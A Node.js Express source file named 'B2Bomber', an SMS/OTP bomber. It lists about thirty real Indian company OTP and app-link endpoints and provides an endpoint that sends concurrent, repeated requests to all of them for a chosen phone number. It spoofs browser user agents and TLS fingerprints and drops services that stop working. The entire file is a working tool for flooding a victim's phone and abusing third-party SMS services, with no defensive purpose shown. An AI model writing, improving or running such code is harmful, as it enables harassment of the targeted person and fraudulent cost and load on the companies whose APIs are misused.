/**
 * ============================================================
 *  B2Bomber — multi-site OTP sender
 *  Node 18+ / 20  ·  ESM  ·  Render-ready  ·  single file
 * ============================================================
 *  Endpoints (public/index.html inhi ko call karta hai):
 *    GET  /api/health            -> { ok, services, live, benched, impit }
 *    GET  /api/diag              -> outbound connectivity + env info
 *    GET  /api/services          -> service list + health
 *    GET  /api/selftest?number=  -> har service ko 1 baar hit karke report
 *    POST /api/stats/reset       -> health / bench reset
 *    POST /api/bomb              -> NDJSON stream: start / ping / result / done / error
 * ============================================================
 */
import express from 'express';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/* ----------------------------- config ----------------------------- */
const PORT        = Number(process.env.PORT || 3000);
const HOST        = '0.0.0.0';
const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 12000); // per request
const CONCURRENCY = Number(process.env.OTP_CONCURRENCY || 8);    // parallel workers
const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 120);   // worker gap
const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);    // lagatar fail -> bench
const HB_MS       = 10000;                                       // stream heartbeat

/* -------------------- crash-proofing (Render) --------------------- */
process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));
process.on('uncaughtException',  e => console.error('[uncaughtException]', e));

/* ------------------------------------------------------------------ *
 * Optional impit (browser/TLS fingerprint). Na mile to global fetch.
 * ------------------------------------------------------------------ */
let ImpitCtor = null;
try {
  const mod = await import('impit');
  ImpitCtor = mod?.Impit || mod?.default?.Impit || mod?.default || null;
  if (typeof ImpitCtor !== 'function') ImpitCtor = null;
} catch { ImpitCtor = null; }

let impitClient = null;
function getImpit() {
  if (!ImpitCtor) return null;
  if (!impitClient) {
    try { impitClient = new ImpitCtor({ browser: 'chrome', ignoreTlsErrors: true }); }
    catch { try { impitClient = new ImpitCtor(); } catch { impitClient = null; } }
  }
  return impitClient;
}

/* ------------------------------------------------------------------ *
 * helpers
 * ------------------------------------------------------------------ */
const sleep = ms => new Promise(r => setTimeout(r, ms));

function hardTimeout(promise, ms) {
  let timer;
  return Promise.race([
    promise,
    new Promise((_, rej) => {
      timer = setTimeout(
        () => rej(Object.assign(new Error('timeout'), { name: 'TimeoutError' })),
        ms
      );
    }),
  ]).finally(() => clearTimeout(timer));
}

const UA = 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';

const JSONH = {
  'content-type': 'application/json',
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-IN,en;q=0.9',
  'user-agent': UA,
};
const FORMH = {
  'content-type': 'application/x-www-form-urlencoded',
  'accept': 'application/json, text/plain, */*',
  'user-agent': UA,
};

function makeCtx(number) {
  let d = String(number || '').replace(/\D/g, '');
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  if (d.length === 10) d = '91' + d;
  const ten = d.slice(-10);
  return { full: d, ten, plus: '+' + d, rnd: () => crypto.randomBytes(4).toString('hex') };
}

/* ------------------------------------------------------------------ *
 * SERVICES
 *   add/remove karne ke liye bas ek object push/delete kar do.
 *   url    : string  ya  (ctx) => string
 *   method : 'GET' | 'POST'   (default GET)
 *   body   : (ctx) => string  (sirf non-GET ke liye)
 * ------------------------------------------------------------------ */
const SERVICES = [
  /* ---------------- shopping / e-commerce ---------------- */
  { id: 'flipkart', name: 'Flipkart', method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: { ...JSONH,
      'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop',
      origin: 'https://www.flipkart.com', referer: 'https://www.flipkart.com/' },
    body: c => JSON.stringify({ loginId: c.ten, otp: '', loginType: 'MOBILE' }) },

  { id: 'myntra', name: 'Myntra', method: 'POST',
    url: 'https://www.myntra.com/gateway/v2/user/otp/send',
    headers: { ...JSONH, origin: 'https://www.myntra.com', referer: 'https://www.myntra.com/' },
    body: c => JSON.stringify({ mobile: c.full }) },

  { id: 'ajio', name: 'Ajio', method: 'POST',
    url: 'https://login.web.ajio.com/api/auth/signupSendOTP',
    headers: { ...JSONH, origin: 'https://www.ajio.com', referer: 'https://www.ajio.com/' },
    body: c => JSON.stringify({ mobile: c.ten }) },

  { id: 'nykaa', name: 'Nykaa', method: 'POST',
    url: 'https://www.nykaa.com/app-api/index.php?a=sendOtp',
    headers: { ...FORMH, origin: 'https://www.nykaa.com', referer: 'https://www.nykaa.com/' },
    body: c => `mobile=${c.full}&device_id=${c.rnd()}` },

  { id: 'nnnow', name: 'NNNow', method: 'POST',
    url: 'https://api.nnnow.com/d/api/appDownloadLink',
    headers: { ...JSONH, origin: 'https://www.nnnow.com' },
    body: c => JSON.stringify({ mobileNumber: c.ten }) },

  { id: 'allensolly', name: 'Allen Solly', method: 'POST',
    url: 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail',
    headers: { ...FORMH, origin: 'https://www.allensolly.com' },
    body: c => `mobile=${c.ten}` },

  { id: 'cashify', name: 'Cashify', method: 'GET',
    url: c => `https://www.cashify.in/api/cu01/v1/app-link?mobile=${c.ten}`,
    headers: { ...JSONH } },

  { id: 'grofers', name: 'Blinkit/Grofers', method: 'POST',
    url: 'https://grofers.com/v2/accounts/',
    headers: { ...JSONH, auth_key: '', origin: 'https://grofers.com' },
    body: c => JSON.stringify({ phone: c.ten }) },

  { id: 'pharmeasy', name: 'PharmEasy', method: 'POST',
    url: 'https://pharmeasy.in/api/auth/requestOTP',
    headers: { ...JSONH, origin: 'https://pharmeasy.in' },
    body: c => JSON.stringify({ phone: c.ten }) },

  /* ---------------- food / travel / rides ---------------- */
  { id: 'zomato', name: 'Zomato', method: 'POST',
    url: 'https://www.zomato.com/webroutes/auth/sendOtp',
    headers: { ...JSONH, origin: 'https://www.zomato.com', referer: 'https://www.zomato.com/' },
    body: c => JSON.stringify({ phone: c.plus, country_code: '91' }) },

  { id: 'porter', name: 'Porter', method: 'POST',
    url: 'https://porter.in/restservice/send_app_link_sms',
    headers: { ...FORMH, origin: 'https://porter.in' },
    body: c => `phone_number=${c.ten}` },

  { id: 'cityflo', name: 'Cityflo', method: 'POST',
    url: 'https://cityflo.com/website-app-download-link-sms/',
    headers: { ...FORMH, origin: 'https://cityflo.com' },
    body: c => `phone=${c.ten}` },

  { id: 'mylescars', name: 'Myles', method: 'POST',
    url: 'https://www.mylescars.com/usermanagements/chkContact',
    headers: { ...FORMH, origin: 'https://www.mylescars.com' },
    body: c => `contact=${c.ten}` },

  { id: 'treebo', name: 'Treebo', method: 'POST',
    url: 'https://www.treebo.com/api/v2/auth/login/otp/',
    headers: { ...JSONH, origin: 'https://www.treebo.com' },
    body: c => JSON.stringify({ mobile: c.ten }) },

  { id: 'happyeasygo', name: 'HappyEasyGo', method: 'GET',
    url: c => `https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phoneNumber=${c.full}&countryCode=91`,
    headers: { ...JSONH } },

  { id: 'redbus', name: 'RedBus', method: 'GET',
    url: c => `https://m.redbus.in/api/getOtp?number=${c.ten}`,
    headers: { ...JSONH } },

  { id: 'confirmtkt', name: 'ConfirmTkt', method: 'GET',
    url: c => `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${c.ten}&countryCode=91`,
    headers: { ...JSONH } },

  /* ---------------- fintech / misc ---------------- */
  { id: 'paytm', name: 'Paytm', method: 'POST',
    url: 'https://commonfront.paytm.com/v4/api/sendsms',
    headers: { ...JSONH, origin: 'https://paytm.com' },
    body: c => JSON.stringify({ phone: c.full, platform: 'web' }) },

  { id: 'dream11', name: 'Dream11', method: 'POST',
    url: 'https://api.dream11.com/sendsmslink',
    headers: { ...JSONH, origin: 'https://www.dream11.com' },
    body: c => JSON.stringify({ phoneNumber: c.full }) },

  { id: 'airtel', name: 'Airtel', method: 'GET',
    url: c => `https://www.airtel.in/referral-api/core/notify?msisdn=${c.full}`,
    headers: { ...JSONH } },

  { id: 'housing', name: 'Housing', method: 'POST',
    url: 'https://login.housing.com/api/v2/send-otp',
    headers: { ...JSONH, origin: 'https://housing.com' },
    body: c => JSON.stringify({ phone: c.full }) },

  { id: 'justdial', name: 'JustDial', method: 'GET',
    url: c => `https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=${c.ten}`,
    headers: { ...JSONH } },

  { id: 'magicbricks', name: 'MagicBricks', method: 'GET',
    url: c => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobileNo=${c.ten}`,
    headers: { ...JSONH } },

  { id: 'makaan', name: 'Makaan', method: 'GET',
    url: c => `https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/${c.full}`,
    headers: { ...JSONH } },

  { id: 'indialends', name: 'IndiaLends', method: 'POST',
    url: 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
    headers: { ...FORMH, origin: 'https://indialends.com' },
    body: c => `mobile=${c.ten}` },

  { id: 'gapoon', name: 'Gapoon', method: 'POST',
    url: 'https://www.gapoon.com/userSignup',
    headers: { ...FORMH, origin: 'https://www.gapoon.com' },
    body: c => `mobile=${c.ten}` },

  { id: 'frotels', name: 'Frotels', method: 'POST',
    url: 'https://www.frotels.com/appsendsms.php',
    headers: { ...FORMH, origin: 'https://www.frotels.com' },
    body: c => `mob=${c.ten}` },

  { id: 'unacademy', name: 'Unacademy', method: 'POST',
    url: 'https://unacademy.com/api/v1/user/get_app_link/',
    headers: { ...JSONH, origin: 'https://unacademy.com' },
    body: c => JSON.stringify({ phone: c.ten }) },

  { id: 'kfc', name: 'KFC', method: 'POST',
    url: 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
    headers: { ...FORMH, origin: 'https://online.kfc.co.in', referer: 'https://online.kfc.co.in/' },
    body: c => `PhoneNumber=${c.ten}` },

  { id: 'tinder', name: 'Tinder', method: 'POST',
    url: 'https://api.gotinder.com/v2/auth/sms/send',
    headers: { ...JSONH, origin: 'https://tinder.com' },
    body: c => JSON.stringify({ phone_number: c.plus }) },
];

/* ------------------------------------------------------------------ *
 * health / bench tracking  (memory only)
 * ------------------------------------------------------------------ */
const health = new Map(); // id -> { ok, fail, streak, benched, status, ms }

function note(svc, ok, status, ms) {
  const h = health.get(svc.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
  h.status = status || 0;
  h.ms = ms || 0;
  if (ok) {
    h.ok++; h.streak = 0; h.benched = false;
  } else {
    h.fail++; h.streak++;
    if (h.streak >= BENCH_AFTER) h.benched = true;
  }
  health.set(svc.id, h);
}

function healthSnapshot() {
  return SERVICES.map(s => {
    const h = health.get(s.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
    return { id: s.id, name: s.name, ...h };
  });
}

/* ------------------------------------------------------------------ *
 * ek service hit karo — kabhi throw nahi karta, hamesha object deta hai
 * ------------------------------------------------------------------ */
async function sendOne(svc, ctx) {
  const t0 = Date.now();
  let url = '';
  try {
    url = typeof svc.url === 'function' ? svc.url(ctx) : svc.url;
    const method = svc.method || 'GET';

    const init = {
      method,
      headers: { ...(svc.headers || {}) },
      redirect: 'follow',
      signal: AbortSignal.timeout(TIMEOUT_MS),
    };
    if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);

    const doCall = async () => {
      const client = svc.impit === false ? null : getImpit();
      if (client) {
        try { return await client.fetch(url, init); } catch { /* fetch pe fallback */ }
      }
      return await fetch(url, init);
    };

    const res = await hardTimeout(doCall(), TIMEOUT_MS + 1500);
    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 5000).catch(() => '');
    const ms = Date.now() - t0;
    const ok = res.status >= 200 && res.status < 400;

    return {
      ok, status: res.status, ms, url,
      snippet: String(text).replace(/\s+/g, ' ').trim().slice(0, 120),
      error: ok ? '' : 'HTTP ' + res.status,
    };
  } catch (e) {
    const ms = Date.now() - t0;
    const msg = e?.name === 'TimeoutError' ? 'timeout' : (e?.message || 'network error');
    return { ok: false, status: 0, ms, url, snippet: '', error: msg };
  }
}

/* ------------------------------------------------------------------ *
 * express app
 * ------------------------------------------------------------------ */
const app = express();
app.set('trust proxy', 1);
app.disable('x-powered-by');
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: false, limit: '256kb' }));

/* permissive CORS */
app.use((req, res, next) => {
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-headers', 'content-type');
  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use((req, _res, next) => { console.log(`${req.method} ${req.url}`); next(); });

/* ------------------------------ health ---------------------------- */
app.get('/api/health', (_req, res) => {
  const benched = [...health.values()].filter(h => h.benched).length;
  res.json({
    ok: true,
    services: SERVICES.length,
    live: SERVICES.length - benched,
    benched,
    impit: !!getImpit(),
    node: process.version,
    uptime: Math.round(process.uptime()),
  });
});

/* --------------------------- stats reset -------------------------- */
app.post('/api/stats/reset', (_req, res) => {
  health.clear();
  res.json({ ok: true, reset: true });
});

/* --------------------------- services ----------------------------- */
app.get('/api/services', (_req, res) => {
  res.json({
    ok: true,
    count: SERVICES.length,
    services: healthSnapshot().map(s => ({ id: s.id, name: s.name, benched: s.benched, ok: s.ok, fail: s.fail, status: s.status, ms: s.ms })),
  });
});

/* ------------------------------ diag ------------------------------ */
app.get('/api/diag', async (_req, res) => {
  const targets = [
    'https://www.google.com/generate_204',
    'https://www.flipkart.com/',
    'https://api.github.com/',
  ];
  const outbound = [];
  for (const t of targets) {
    const t0 = Date.now();
    try {
      const r = await fetch(t, { signal: AbortSignal.timeout(8000) });
      outbound.push({ target: t, ok: true, status: r.status, ms: Date.now() - t0 });
    } catch (e) {
      outbound.push({ target: t, ok: false, error: e?.message || 'error', ms: Date.now() - t0 });
    }
  }
  res.json({
    ok: true,
    node: process.version,
    platform: process.platform,
    region: process.env.RENDER_REGION || process.env.REGION || 'n/a',
    impit: !!getImpit(),
    services: SERVICES.length,
    benched: [...health.entries()].filter(([, h]) => h.benched).map(([id]) => id),
    outbound,
  });
});

/* ---------------------------- self-test --------------------------- */
app.get('/api/selftest', async (req, res) => {
  const raw = String(req.query.number || '9999999999');
  const ctx = makeCtx(raw.length === 10 ? raw : raw.slice(-10));
  const list = SERVICES.slice(0, 40);

  const results = [];
  let idx = 0;

  const workers = Array.from({ length: Math.min(CONCURRENCY, list.length) }, async () => {
    while (true) {
      const i = idx++;
      if (i >= list.length) return;
      const svc = list[i];
      const r = await sendOne(svc, ctx);
      note(svc, r.ok, r.status, r.ms);
      results.push({
        id: svc.id, name: svc.name, ok: r.ok, status: r.status,
        ms: r.ms, error: r.error, snippet: r.snippet, url: r.url,
      });
    }
  });

  await Promise.all(workers);

  res.json({
    ok: results.filter(r => r.ok).length,
    total: results.length,
    number: ctx.full,
    results,
  });
});

/* ------------------- main bomber : NDJSON stream ------------------- */
app.post('/api/bomb', async (req, res) => {
  try {
    const number = String(req.body?.number || '').replace(/\D/g, '');
    const repeat = Math.min(20, Math.max(1, Number(req.body?.repeat) || 1));
    const skipDead = req.body?.skipDead !== false;

    if (number.length < 10 || number.length > 15) {
      return res.status(400).json({ error: 'invalid number' });
    }

    const ctx = makeCtx(number);
    const active = SERVICES.filter(s => !(skipDead && health.get(s.id)?.benched));
    const skipped = SERVICES.length - active.length;
    const total = active.length * repeat;

    res.writeHead(200, {
      'content-type': 'application/x-ndjson; charset=utf-8',
      'cache-control': 'no-cache, no-transform',
      'x-accel-buffering': 'no',
    });
    res.flushHeaders?.();

    // IMPORTANT: 'close' ko res par suno, req par nahi.
    // req 'close' body padhne ke baad hi fire hota hai (Node 16+),
    // isliye pehle turant abort lag jata tha aur 0 result aata tha.
    let closed = false;
    res.on('close', () => { if (!res.writableEnded) closed = true; });
    res.on('error', () => { closed = true; });

    const emit = (o) => {
      if (res.writableEnded) return;
      try { res.write(JSON.stringify(o) + '\n'); } catch {}
    };

    // proxy buffering ke against heartbeat (frontend ise skip karta hai)
    const hb = setInterval(() => emit({ type: 'ping', t: Date.now() }), HB_MS);

    const finishAll = (o) => {
      clearInterval(hb);
      emit(o);
      if (!res.writableEnded) { try { res.end(); } catch {} }
    };

    emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });

    if (!total) return finishAll({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });

    // round-major queue -> consecutive tasks alag-alag service
    const tasks = [];
    for (let r = 0; r < repeat; r++) for (const s of active) tasks.push(s);

    let cursor = 0, done = 0, sent = 0, failed = 0;

    const worker = async () => {
      while (!closed) {
        const i = cursor++;
        if (i >= tasks.length) return;
        const svc = tasks[i];

        let r;
        try { r = await sendOne(svc, ctx); }
        catch (e) {
          r = { ok: false, status: 0, ms: 0, url: '', snippet: '', error: e?.message || 'worker error' };
        }
        if (closed) return;

        note(svc, r.ok, r.status, r.ms);
        done++; r.ok ? sent++ : failed++;

        emit({
          type: 'result', done, sent, failed,
          id: svc.id, name: svc.name,
          status: r.status, ms: r.ms, ok: r.ok,
          error: r.error, snippet: r.snippet, url: r.url,
        });

        if (STAGGER_MS) await sleep(STAGGER_MS);
      }
    };

    try {
      await Promise.all(Array.from({ length: Math.min(CONCURRENCY, tasks.length) }, worker));
    } catch (e) {
      emit({ type: 'error', error: e?.message || 'worker crashed' });
    }

    finishAll({ type: 'done', sent, failed, total, done });
  } catch (e) {
    console.error('[bomb]', e);
    if (!res.headersSent) {
      res.status(500).json({ error: e?.message || 'server error' });
    } else {
      try {
        res.write(JSON.stringify({ type: 'error', error: e?.message || 'server error' }) + '\n');
        res.end();
      } catch {}
    }
  }
});

/* ---------------------------- API 404 ----------------------------- */
app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));

/* --------------------------- static files -------------------------- */
app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/favicon.ico', (_req, res) => res.status(204).end());

/* -------------------------- error handler -------------------------- */
app.use((err, _req, res, _next) => {
  console.error('[error]', err);
  if (!res.headersSent) res.status(500).json({ error: err?.message || 'server error' });
});

/* ------------------------------ listen ----------------------------- */
const server = app.listen(PORT, HOST, () => {
  console.log(`B2Bomber up on :${PORT} | ${SERVICES.length} services | impit ${getImpit() ? 'ON' : 'OFF'} | node ${process.version}`);
});

server.keepAliveTimeout = 65000;
server.headersTimeout  = 66000;
server.requestTimeout  = 0;   // long stream ke liye
server.timeout         = 0;

export default app;
